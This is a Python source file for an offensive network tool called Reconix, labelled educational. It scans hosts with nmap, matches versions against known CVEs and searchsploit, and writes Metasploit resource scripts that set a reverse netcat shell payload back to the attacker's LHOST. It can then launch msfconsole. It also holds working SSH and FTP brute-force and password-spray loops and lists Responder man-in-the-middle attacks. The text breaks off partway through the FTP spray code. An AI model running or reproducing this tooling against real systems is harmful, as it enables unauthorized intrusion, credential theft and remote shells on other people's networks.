#!/usr/bin/env python3
"""
Reconix - Advanced Network Reconnaissance Tool
A comprehensive network mapping and vulnerability assessment tool
Version 2.0 - Enhanced Edition
"""

import nmap
import socket
import time
import json
import sys
import argparse
import subprocess
import os
from datetime import datetime
from typing import Dict, List, Tuple

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Known vulnerabilities database (simplified)
VULN_DB = {
    'ftp': {
        'vsftpd 2.3.4': ['CVE-2011-2523 - Backdoor Command Execution'],
        'ProFTPD 1.3.3c': ['CVE-2010-4221 - SQL Injection']
    },
    'ssh': {
        'OpenSSH 7.2': ['CVE-2016-6515 - Denial of Service'],
        'OpenSSH 7.4': ['CVE-2017-15906 - Read-only bypass']
    },
    'http': {
        'Apache 2.4.49': ['CVE-2021-41773 - Path Traversal'],
        'nginx 1.18.0': ['Potential outdated version risks']
    },
    'smb': {
        'Samba 3.5.0': ['CVE-2010-2063 - Memory Corruption'],
        'Samba 4.5.0': ['CVE-2017-7494 - Remote Code Execution']
    }
}

# Port to service mapping for brute force detection
# Only includes ports that are directly bruteforceable: SSH, FTP, SMB, RDP
PORT_SERVICE_MAP = {
    21:   'ftp',
    22:   'ssh',
    445:  'smb',
    3389: 'rdp',
}

# Map detected service names to brute-force attack type
BRUTEFORCE_SERVICE_MAP = {
    'ftp':           'ftp',
    'ssh':           'ssh',
    'microsoft-ds':  'smb',
    'smb':           'smb',
    'rdp':           'rdp',
    'ms-wbt-server': 'rdp',
}

# System shares to skip during SMB enumeration
SYSTEM_SHARES = ['ADMIN$', 'C$', 'IPC$', 'print$', 'D$', 'E$', 'F$']

# Global variable to store scan results
SCAN_RESULTS = []

def print_logo():
    logo = f"""
{CYAN}{BOLD}
    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗██╗  ██╗
    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║██║╚██╗██╔╝
    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║██║ ╚███╔╝ 
    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║██║ ██╔██╗ 
    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██║██╔╝ ██╗
    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{RESET}
{YELLOW}         Advanced Network Reconnaissance Tool v2.0 Enhanced{RESET}
{WHITE}            ─────────────────────────────────────────{RESET}
{GREEN}            Author: Sawsage | Educational Use Only{RESET}
{WHITE}            ─────────────────────────────────────────{RESET}
"""
    print(logo)
    time.sleep(1)

def print_help():
    help_text = f"""
{CYAN}{BOLD}RECONIX - Advanced Network Reconnaissance Tool{RESET}

{BOLD}{GREEN}USAGE:{RESET}
    sudo python3 reconix.py [OPTIONS] <target>

{BOLD}{GREEN}TARGET:{RESET}
    <target>    Network or IP (e.g., 192.168.1.0/24, 10.0.0.1)

{BOLD}{GREEN}SCAN OPTIONS:{RESET}
    -sA, --all-ports      Scan all 65535 ports
    -sF, --fast           Fast scan (top 100 ports)
    -PA, --aggressive-discovery  Accurate host discovery
    -T0 to -T5            Timing (0=slow, 5=fast)

{BOLD}{GREEN}OPTIONS:{RESET}
    -h, --help            Show this help
    -v, --verbose         Verbose output
    -q, --quiet           Quiet mode
    -o, --output FILE     Save to JSON file

{BOLD}{GREEN}EXAMPLES:{RESET}
    sudo python3 reconix.py 192.168.1.0/24
    sudo python3 reconix.py -PA -sF 172.16.8.0/24
"""
    print(help_text)

def animate_text(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_status(message, status='info'):
    icons = {
        'info': f'{BLUE}[*]{RESET}',
        'success': f'{GREEN}[+]{RESET}',
        'warning': f'{YELLOW}[!]{RESET}',
        'error': f'{RED}[-]{RESET}',
        'scan': f'{CYAN}[~]{RESET}'
    }
    icon = icons.get(status, icons['info'])
    print(f"{icon} {message}")

def check_tool(tool_name):
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        return False

def extract_detailed_version(nm, host, port, proto='tcp'):
    try:
        port_info = nm[host][proto][port]
        version_parts = []
        if port_info.get('product'):
            version_parts.append(port_info['product'])
        if port_info.get('version'):
            version_parts.append(port_info['version'])
        if port_info.get('extrainfo'):
            extra = port_info['extrainfo']
            if extra and extra not in ['', 'protocol 2.0']:
                version_parts.append(f"({extra})")
        if port_info.get('ostype'):
            version_parts.append(f"[{port_info['ostype']}]")
        return ' '.join(version_parts) if version_parts else 'unknown'
    except Exception:
        return 'unknown'

def enhanced_service_detection(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        if port in [80, 8080, 8000, 3000]:
            sock.send(b"GET / HTTP/1.0\r\n\r\n")
        elif port == 21:
            pass
        elif port == 25:
            pass
        else:
            sock.send(b"\r\n")
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:200] if banner else None
    except:
        return None

def discover_hosts(network, aggressive=False):
    print_status("Initializing network scanner...", 'scan')
    time.sleep(0.5)
    print_status(f"Scanning network: {network}", 'info')
    nm = nmap.PortScanner()
    animate_text(f"{YELLOW}[~] Searching for active hosts...{RESET}", 0.02)
    try:
        if aggressive:
            print_status("Using aggressive discovery (checking actual ports)...", 'info')
            nm.scan(hosts=network, arguments='-Pn --top-ports 10 --open')
        else:
            nm.scan(hosts=network, arguments='-sn -PS22,80,443,445,3389 --min-parallelism 100')
        hosts = []
        for host in nm.all_hosts():
            if aggressive:
                if host in nm.all_hosts() and 'tcp' in nm[host]:
                    open_ports = [port for port in nm[host]['tcp'].keys() if nm[host]['tcp'][port]['state'] == 'open']
                    if open_ports:
                        hosts.append(host)
                        print_status(f"Found active host: {GREEN}{host}{RESET} (Open ports: {', '.join(map(str, open_ports))})", 'success')
                        time.sleep(0.1)
            else:
                if nm[host].state() == 'up':
                    hosts.append(host)
                    print_status(f"Found active host: {GREEN}{host}{RESET}", 'success')
                    time.sleep(0.1)
        if len(hosts) > 100 and not aggressive:
            print_status(f"{YELLOW}Warning: Found {len(hosts)} hosts. Try -PA for accuracy.{RESET}", 'warning')
        print_status(f"Host discovery complete! Found {len(hosts)} active host(s)", 'success')
        return hosts
    except Exception as e:
        print_status(f"Error during host discovery: {e}", 'error')
        return []

def scan_host(host, args=None):
    print_status(f"Scanning host: {CYAN}{host}{RESET}", 'scan')
    nm = nmap.PortScanner()
    host_data = {
        'ip': host,
        'hostname': '',
        'os': '',
        'ports': [],
        'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    nmap_args = []
    if args and args.syn:
        nmap_args.append('-sS')
    elif args and args.udp:
        nmap_args.append('-sU')
    else:
        nmap_args.append('-sT')
    if args and args.all_ports:
        nmap_args.append('-p-')
    elif args and args.fast:
        nmap_args.append('--top-ports 100')
    else:
        nmap_args.append('--top-ports 1000')
    nmap_args.extend(['-sV', '--version-intensity 9', '-O', '--osscan-guess', '-sC'])
    if args and args.timing:
        nmap_args.append(f'-T{args.timing}')
    else:
        nmap_args.append('-T4')
    if args and args.vuln_scan:
        nmap_args.append('--script=vuln')
    final_args = ' '.join(nmap_args)
    try:
        try:
            host_data['hostname'] = socket.gethostbyaddr(host)[0]
        except:
            host_data['hostname'] = 'Unknown'
        if args and not args.quiet:
            animate_text(f"  {YELLOW}→ Scanning ports and services...{RESET}", 0.02)
        nm.scan(host, arguments=final_args)
        if host in nm.all_hosts():
            if 'osmatch' in nm[host] and nm[host]['osmatch']:
                os_match = nm[host]['osmatch'][0]
                host_data['os'] = f"{os_match['name']} (Accuracy: {os_match['accuracy']}%)"
            else:
                host_data['os'] = 'Unknown'
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    port_info = nm[host][proto][port]
                    service = port_info.get('name', 'unknown')
                    version = extract_detailed_version(nm, host, port, proto)
                    if version == 'unknown' or version == '':
                        banner = enhanced_service_detection(host, port)
                        if banner:
                            version = banner[:100]
                    port_data = {
                        'port': port,
                        'state': port_info['state'],
                        'service': service,
                        'version': version,
                        'vulnerabilities': []
                    }
                    if service in VULN_DB:
                        for vuln_version, vulns in VULN_DB[service].items():
                            if vuln_version.lower() in version.lower():
                                port_data['vulnerabilities'].extend(vulns)
                    host_data['ports'].append(port_data)
        if args and not args.quiet:
            print_status(f"Scan complete for {host}", 'success')
    except Exception as e:
        print_status(f"Error scanning {host}: {e}", 'error')
    return host_data

def print_tree_structure(scan_results):
    print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
    print(f"{BOLD}{CYAN}                    NETWORK TOPOLOGY MAP{RESET}")
    print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
    if scan_results:
        network_prefix = '.'.join(scan_results[0]['ip'].split('.')[:-1])
        print(f"{MAGENTA}Network: {network_prefix}.0/24{RESET}")
    print(f"{WHITE}│{RESET}")
    for i, result in enumerate(scan_results):
        is_last = i == len(scan_results) - 1
        connector = "└──" if is_last else "├──"
        print(f"{WHITE}{connector}{RESET} {CYAN}{BOLD}{result['ip']}{RESET}")
        if result['hostname'] != 'Unknown':
            print(f"{WHITE}│   ├─{RESET} Hostname: {GREEN}{result['hostname']}{RESET}")
        open_ports = [p for p in result['ports'] if p['state'] == 'open']
        for j, port in enumerate(open_ports):
            is_last_port = j == len(open_ports) - 1
            port_connector = "└─" if is_last_port else "├─"
            print(f"{WHITE}│   {port_connector}{RESET} Port {YELLOW}{port['port']}{RESET}")
        if not is_last:
            print(f"{WHITE}│{RESET}")

def print_detailed_report(scan_results):
    print(f"\n{BOLD}{GREEN}{'='*70}{RESET}")
    print(f"{BOLD}{GREEN}                    DETAILED SCAN REPORT{RESET}")
    print(f"{BOLD}{GREEN}{'='*70}{RESET}\n")
    for result in scan_results:
        print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{BLUE}║{RESET}  Host: {CYAN}{result['ip']:<52}{BLUE}║{RESET}")
        print(f"{BOLD}{BLUE}╚══════════════════════════════════════════════════════════════╝{RESET}")
        print(f"\n  {WHITE}→ Hostname:{RESET} {result['hostname']}")
        print(f"  {WHITE}→ Operating System:{RESET} {result['os']}")
        print(f"  {WHITE}→ Scan Time:{RESET} {result['scan_time']}\n")
        open_ports = [p for p in result['ports'] if p['state'] == 'open']
        if open_ports:
            print(f"  {BOLD}{YELLOW}Open Ports & Services:{RESET}\n")
            print(f"  {'Port':<8} {'Service':<15} {'Version':<30} {'Status'}")
            print(f"  {'-'*70}")
            for port in open_ports:
                vuln_indicator = f"{RED}[!]{RESET}" if port['vulnerabilities'] else f"{GREEN}[✓]{RESET}"
                version_display = port['version'][:28] + '..' if len(port['version']) > 30 else port['version']
                print(f"  {port['port']:<8} {port['service']:<15} {version_display:<30} {vuln_indicator}")
                if port['vulnerabilities']:
                    for vuln in port['vulnerabilities']:
                        print(f"       {RED}└─ ⚠ {vuln}{RESET}")
        else:
            print(f"  {YELLOW}No open ports detected{RESET}")
        print()

def ensure_reports_directory():
    reports_dir = "reports"
    if not os.path.exists(reports_dir):
        os.makedirs(reports_dir)
    return reports_dir

def save_report(scan_results, filename=None):
    reports_dir = ensure_reports_directory()
    if filename is None:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'reconix_scan_{timestamp}.json'
    if not filename.startswith('reports/'):
        filename = os.path.join(reports_dir, os.path.basename(filename))
    print_status(f"Saving report to {filename}...", 'info')
    try:
        with open(filename, 'w') as f:
            json.dump(scan_results, f, indent=4)
        print_status(f"Report saved successfully to {GREEN}{filename}{RESET}", 'success')
    except Exception as e:
        print_status(f"Error saving report: {e}", 'error')

def interactive_menu(scan_results):
    global SCAN_RESULTS
    SCAN_RESULTS = scan_results
    while True:
        print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{CYAN}║              WHAT WOULD YOU LIKE TO DO NEXT?                 ║{RESET}")
        print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
        print(f"{GREEN}[1]{RESET}  🔍 Deep Vulnerability Analysis (searchsploit)")
        print(f"{GREEN}[2]{RESET}  🎯 Attempt Exploitation (Metasploit)")
        print(f"{GREEN}[3]{RESET}  🔨 Brute Force Attacks (SSH/SMB/FTP/RDP)")
        print(f"{GREEN}[4]{RESET}  📊 Generate Security Report (HTML)")
        print(f"{GREEN}[5]{RESET}  🗂️  SMB Share Enumeration")
        print(f"{GREEN}[6]{RESET}  🌐 Web Application Scanning")
        print(f"{GREEN}[7]{RESET}  🛡️  Get Hardening Recommendations")
        print(f"{GREEN}[8]{RESET}  🔴 Man-in-the-Middle (Responder)")
        print(f"{GREEN}[9]{RESET}  🔄 Re-scan Options")
        print(f"{RED}[0]{RESET}  🚪 Exit\n")
        try:
            choice = input(f"{CYAN}Select option: {RESET}")
            if choice == '1':
                deep_vulnerability_analysis(scan_results)
            elif choice == '2':
                attempt_exploitation(scan_results)
            elif choice == '3':
                brute_force_attack(scan_results)
            elif choice == '4':
                generate_security_report(scan_results)
            elif choice == '5':
                smb_enumeration(scan_results)
            elif choice == '6':
                web_application_scan(scan_results)
            elif choice == '7':
                hardening_recommendations(scan_results)
            elif choice == '8':
                mitm_with_responder()
            elif choice == '9':
                print_status("Re-scan feature - please restart the tool with new parameters", 'info')
                input(f"\n{YELLOW}Press Enter to continue...{RESET}")
            elif choice == '0':
                print(f"\n{YELLOW}Thank you for using Reconix!{RESET}\n")
                break
            else:
                print_status("Invalid option!", 'error')
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}Returning to menu...{RESET}\n")
            time.sleep(1)

def categorize_vulnerability(vuln_text):
    vuln_lower = vuln_text.lower()
    if any(keyword in vuln_lower for keyword in ['rce', 'remote code execution', 'unauthenticated rce', 'arbitrary code']):
        return 'CRITICAL', RED
    if any(keyword in vuln_lower for keyword in ['sql injection', 'command injection', 'authentication bypass', 'privilege escalation']):
        return 'HIGH', YELLOW
    if any(keyword in vuln_lower for keyword in ['xss', 'csrf', 'information disclosure', 'denial of service']):
        return 'MEDIUM', BLUE
    return 'INFO', WHITE

def deep_vulnerability_analysis(scan_results):
    print(f"\n{BOLD}{MAGENTA}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{MAGENTA}║           🔍 DEEP VULNERABILITY ANALYSIS                     ║{RESET}")
    print(f"{BOLD}{MAGENTA}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    if not check_tool('searchsploit'):
        print_status("searchsploit not found! Install: sudo apt install exploitdb", 'error')
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    vulnerabilities_found = []
    for result in scan_results:
        print(f"\n{CYAN}[*] Analyzing {result['ip']}...{RESET}\n")
        open_ports = [p for p in result['ports'] if p['state'] == 'open']
        for port in open_ports:
            if port['version'] and port['version'] != 'unknown':
                search_terms = []
                search_terms.append(f"{port['service']} {port['version']}")
                import re
                version_match = re.search(r'(\d+\.[\d\.]+)', port['version'])
                if version_match:
                    version_num = version_match.group(1)
                    search_terms.append(f"{port['service']} {version_num}")
                product_match = re.match(r'^([A-Za-z\s]+)', port['version'])
                if product_match:
                    product = product_match.group(1).strip()
                    if product and product != port['service']:
                        search_terms.append(product)
                for search_term in search_terms[:2]:
                    print(f"{YELLOW}[~] Searching: {search_term}{RESET}")
                    try:
                        result_cmd = subprocess.run(['searchsploit', search_term],
                                                    capture_output=True, text=True, timeout=10)
                        if result_cmd.stdout:
                            lines = result_cmd.stdout.strip().split('\n')
                            exploit_lines = [l for l in lines if '|' in l and not l.startswith('-')]
                            if len(exploit_lines) > 0:
                                print(f"{GREEN}[+] Found {len(exploit_lines)} exploit(s)!{RESET}\n")
                                for line in exploit_lines[:10]:
                                    parts = line.split('|')
                                    if len(parts) >= 2:
                                        exploit_name = parts[0].strip()
                                        exploit_path = parts[1].strip()
                                        severity, color = categorize_vulnerability(exploit_name)
                                        print(f"  {color}[{severity}]{RESET} {exploit_name}")
                                        print(f"           Path: {exploit_path}\n")
                                        vulnerabilities_found.append({
                                            'host': result['ip'],
                                            'port': port['port'],
                                            'service': f"{port['service']} {port['version']}",
                                            'exploit': exploit_name,
                                            'severity': severity
                                        })
                                break
                            else:
                                print(f"{BLUE}[*] No exploits in database{RESET}\n")
                        else:
                            print(f"{BLUE}[*] No results{RESET}\n")
                    except subprocess.TimeoutExpired:
                        print(f"{RED}[-] Search timeout{RESET}\n")
                    except Exception as e:
                        print_status(f"Error: {e}", 'error')
    if vulnerabilities_found:
        print(f"\n{BOLD}{RED}{'='*70}{RESET}")
        print(f"{BOLD}{RED}           VULNERABILITY SUMMARY{RESET}")
        print(f"{BOLD}{RED}{'='*70}{RESET}\n")
        critical = [v for v in vulnerabilities_found if v['severity'] == 'CRITICAL']
        high = [v for v in vulnerabilities_found if v['severity'] == 'HIGH']
        medium = [v for v in vulnerabilities_found if v['severity'] == 'MEDIUM']
        if critical:
            print(f"{RED}{BOLD}CRITICAL ({len(critical)}):{RESET}")
            for vuln in critical[:5]:
                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}")
                print(f"    {vuln['exploit']}\n")
        if high:
            print(f"{YELLOW}{BOLD}HIGH ({len(high)}):{RESET}")
            for vuln in high[:5]:
                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}")
                print(f"    {vuln['exploit']}\n")
        if medium:
            print(f"{BLUE}{BOLD}MEDIUM ({len(medium)}):{RESET}")
            for vuln in medium[:3]:
                print(f"  • {vuln['host']}:{vuln['port']} - {vuln['service']}\n")
        print(f"{WHITE}Total vulnerabilities found: {len(vulnerabilities_found)}{RESET}")
    else:
        print(f"\n{GREEN}[+] No exploits found in database for scanned services{RESET}")
        print(f"{YELLOW}[!] This doesn't mean the services are secure - consider manual testing{RESET}")
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def attempt_exploitation(scan_results):
    print(f"\n{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{RED}║           🎯 EXPLOITATION MODULE                             ║{RESET}")
    print(f"{BOLD}{RED}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    vuln_list = []
    for result in scan_results:
        for port in result['ports']:
            if port['state'] == 'open' and port['vulnerabilities']:
                for vuln in port['vulnerabilities']:
                    vuln_list.append({
                        'host': result['ip'],
                        'port': port['port'],
                        'service': port['service'],
                        'version': port['version'],
                        'vuln': vuln,
                        'source': 'database'
                    })
    if check_tool('searchsploit'):
        print_status("Searching for additional exploits...", 'info')
        for result in scan_results:
            for port in result['ports']:
                if port['state'] == 'open' and port['version'] != 'unknown':
                    try:
                        search_term = f"{port['service']} {port['version']}"
                        result_cmd = subprocess.run(['searchsploit', '-j', search_term],
                                                    capture_output=True, text=True, timeout=5)
                        if result_cmd.stdout:
                            try:
                                import json as json_lib
                                exploits = json_lib.loads(result_cmd.stdout)
                                if 'RESULTS_EXPLOIT' in exploits and exploits['RESULTS_EXPLOIT']:
                                    for exploit in exploits['RESULTS_EXPLOIT'][:3]:
                                        vuln_list.append({
                                            'host': result['ip'],
                                            'port': port['port'],
                                            'service': port['service'],
                                            'version': port['version'],
                                            'vuln': exploit.get('Title', 'Unknown'),
                                            'exploit_path': exploit.get('Path', ''),
                                            'source': 'searchsploit'
                                        })
                            except:
                                pass
                    except:
                        pass
        print()
    if not vuln_list:
        print_status("No vulnerabilities found to exploit!", 'warning')
        print(f"\n{YELLOW}Recommendations:{RESET}")
        print("  • Run Option 1 (Deep Vulnerability Analysis) for detailed scanning")
        print("  • Check for web vulnerabilities (Option 6)")
        print("  • Try brute force attacks (Option 3)")
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
        return
    print(f"{YELLOW}Exploitable Vulnerabilities Found:{RESET}\n")
    for idx, vuln in enumerate(vuln_list, 1):
        severity, color = categorize_vulnerability(vuln['vuln'])
        print(f"{GREEN}[{idx}]{RESET} {color}[{severity}]{RESET} {vuln['host']}:{vuln['port']}")
        print(f"    Service: {vuln['service']} {vuln['version']}")
        print(f"    Vuln: {vuln['vuln'][:60]}...")
        if vuln.get('exploit_path'):
            print(f"    Path: {vuln['exploit_path']}")
        print()
    try:
        choice = int(input(f"{CYAN}Select vulnerability to exploit (0 to cancel): {RESET}"))
        if choice == 0 or choice > len(vuln_list):
            return
        selected = vuln_list[choice - 1]
        print(f"\n{YELLOW}Target: {CYAN}{selected['host']}:{selected['port']}{RESET}")
        print(f"{YELLOW}Service: {CYAN}{selected['service']} {selected['version']}{RESET}")
        print(f"{YELLOW}Vulnerability: {RED}{selected['vuln']}{RESET}\n")
        lhost = input(f"{CYAN}Enter LHOST (your IP): {RESET}")
        lport = input(f"{CYAN}Enter LPORT (your port, default 4444): {RESET}") or "4444"
        reports_dir = ensure_reports_directory()
        resource_file = os.path.join(reports_dir, f"exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc")
        print(f"\n{YELLOW}[~] Creating Metasploit resource script: {resource_file}{RESET}\n")
        suggested_modules = []
        vuln_lower = selected['vuln'].lower()
        if 'vsftpd' in vuln_lower and '2.3.4' in vuln_lower:
            suggested_modules.append('exploit/unix/ftp/vsftpd_234_backdoor')
        elif 'samba' in vuln_lower:
            suggested_modules.append('exploit/linux/samba/is_known_pipename')
            suggested_modules.append('exploit/multi/samba/usermap_script')
        elif 'apache' in vuln_lower and 'path traversal' in vuln_lower:
            suggested_modules.append('exploit/multi/http/apache_normalize_path_rce')
        elif 'ssh' in selected['service'].lower():
            suggested_modules.append('auxiliary/scanner/ssh/ssh_login')
        rc_content = f"""# Reconix Auto-Generated Exploit Script
# Target: {selected['host']}:{selected['port']}
# Service: {selected['service']} {selected['version']}
# Vulnerability: {selected['vuln']}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

"""
        if suggested_modules:
            rc_content += f"# Suggested Metasploit modules:\n"
            for module in suggested_modules:
                rc_content += f"# - {module}\n"
            rc_content += "\n"
            rc_content += f"use {suggested_modules[0]}\n"
            rc_content += f"set RHOSTS {selected['host']}\n"
            rc_content += f"set RPORT {selected['port']}\n"
            if 'auxiliary' not in suggested_modules[0]:
                rc_content += f"set LHOST {lhost}\n"
                rc_content += f"set LPORT {lport}\n"
                rc_content += "set payload cmd/unix/reverse_netcat\n"
            rc_content += "show options\n"
            rc_content += "# exploit\n\n"
        else:
            rc_content += f"# Manual exploitation required\n"
            rc_content += f"search {selected['service']} {selected['version']}\n\n"
            rc_content += f"# set RHOSTS {selected['host']}\n"
            rc_content += f"# set RPORT {selected['port']}\n"
            rc_content += f"# set LHOST {lhost}\n"
            rc_content += f"# set LPORT {lport}\n"
            rc_content += f"# exploit\n\n"
        rc_content += f"""# Common payloads:
# Linux:   payload/cmd/unix/reverse_netcat
# Windows: payload/windows/meterpreter/reverse_tcp
# Generic: payload/generic/shell_reverse_tcp
"""
        try:
            with open(resource_file, 'w') as f:
                f.write(rc_content)
            print(f"{GREEN}[+] Resource script created: {resource_file}{RESET}\n")
        except Exception as e:
            print_status(f"Failed to create resource script: {e}", 'error')
        print(f"{BOLD}{CYAN}{'='*70}{RESET}")
        print(f"{BOLD}{CYAN}              EXPLOITATION GUIDE{RESET}")
        print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
        if suggested_modules:
            print(f"{GREEN}[+] Suggested Module: {suggested_modules[0]}{RESET}\n")
        print(f"{YELLOW}Option 1: Load Resource Script{RESET}")
        print(f"{CYAN}  msfconsole -r {resource_file}{RESET}\n")
        print(f"{YELLOW}Option 2: Manual Commands{RESET}")
        print(f"{CYAN}  msfconsole{RESET}")
        if suggested_modules:
            print(f"{CYAN}  use {suggested_modules[0]}{RESET}")
        else:
            print(f"{CYAN}  search {selected['service']} {selected['version']}{RESET}")
        print(f"{CYAN}  set RHOSTS {selected['host']}{RESET}")
        print(f"{CYAN}  set RPORT {selected['port']}{RESET}")
        print(f"{CYAN}  set LHOST {lhost}{RESET}")
        print(f"{CYAN}  set LPORT {lport}{RESET}")
        print(f"{CYAN}  exploit{RESET}\n")
        launch = input(f"{YELLOW}Launch msfconsole now? (y/n): {RESET}").lower()
        if launch == 'y':
            print(f"\n{GREEN}[+] Launching msfconsole with resource script...{RESET}\n")
            time.sleep(1)
            os.system(f"msfconsole -r {resource_file}")
    except ValueError:
        print_status("Invalid input!", 'error')
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Cancelled{RESET}")
    except Exception as e:
        print_status(f"Error: {e}", 'error')
    input(f"\n{YELLOW}Press Enter to continue...{RESET}")

def attacking_ssh(target_ip):
    try:
        import paramiko
    except ImportError:
        print_status("paramiko not installed! Install: pip3 install paramiko", 'error')
        return
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"\n{YELLOW}Attack Mode:{RESET}")
    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
    try:
        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
    except ValueError:
        print_status("Invalid input!", 'error')
        return
    if attack_type == 1:
        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(user_list, 'r') as u:
                users = [line.strip() for line in u if line.strip()]
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError as e:
            print_status(f"File not found: {e}", 'error')
            return
        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:22...{RESET}\n")
        found = False
        for user in users:
            for password in passwords:
                try:
                    client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                    found = True
                    client.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
                except Exception:
                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
                finally:
                    try:
                        client.close()
                    except:
                        pass
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 2:
        user = input(f"{CYAN}Enter username: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError:
            print_status(f"Password file not found: {pass_list}", 'error')
            return
        print_status(f"Loaded {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Testing user '{user}' on {target_ip}:22...{RESET}\n")
        found = False
        for password in passwords:
            try:
                client.connect(hostname=target_ip, username=user, password=password, timeout=3, banner_timeout=3)
                print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                found = True
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"{RED}[-]{RESET} Failed: {password}")
            except Exception:
                print(f"{RED}[-]{RESET} Connection error: {password}")
            finally:
                try:
                    client.close()
                except:
                    pass
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 3:
        print(f"\n{YELLOW}[~] Testing anonymous login on {target_ip}:22...{RESET}\n")
        try:
            client.connect(hostname=target_ip, username="anonymous", password="anonymous", timeout=5)
            print(f"{GREEN}[+] Anonymous login SUCCESSFUL!{RESET}")
            client.close()
        except:
            print(f"{RED}[-] Anonymous login failed{RESET}")

def attacking_ftp(target_ip):
    import ftplib
    print(f"\n{YELLOW}Attack Mode:{RESET}")
    print(f"{GREEN}[1]{RESET} Full Brute Force (user_list + pass_list)")
    print(f"{GREEN}[2]{RESET} User Spray (single_user + pass_list)")
    print(f"{GREEN}[3]{RESET} Anonymous Login Test")
    try:
        attack_type = int(input(f"\n{CYAN}Select attack mode: {RESET}"))
    except ValueError:
        print_status("Invalid input!", 'error')
        return
    if attack_type == 1:
        user_list = input(f"{CYAN}Enter path to username list: {RESET}")
        pass_list = input(f"{CYAN}Enter path to password list: {RESET}")
        try:
            with open(user_list, 'r') as u:
                users = [line.strip() for line in u if line.strip()]
            with open(pass_list, 'r') as p:
                passwords = [line.strip() for line in p if line.strip()]
        except FileNotFoundError as e:
            print_status(f"File not found: {e}", 'error')
            return
        print_status(f"Loaded {len(users)} users and {len(passwords)} passwords", 'info')
        print(f"\n{YELLOW}[~] Starting brute force attack on {target_ip}:21...{RESET}\n")
        found = False
        for user in users:
            for password in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target_ip, 21, timeout=5)
                    ftp.login(user, password)
                    print(f"{GREEN}[+] SUCCESS! User: {BOLD}{user}{RESET}{GREEN} | Password: {BOLD}{password}{RESET}")
                    found = True
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    print(f"{RED}[-]{RESET} Failed: {user}:{password}")
                except Exception:
                    print(f"{RED}[-]{RESET} Connection error: {user}:{password}")
                finally:
                    try:
                        ftp.quit()
                    except:
                        pass
        if not found:
            print_status("No valid credentials found", 'warning')
    elif attack_type == 2:
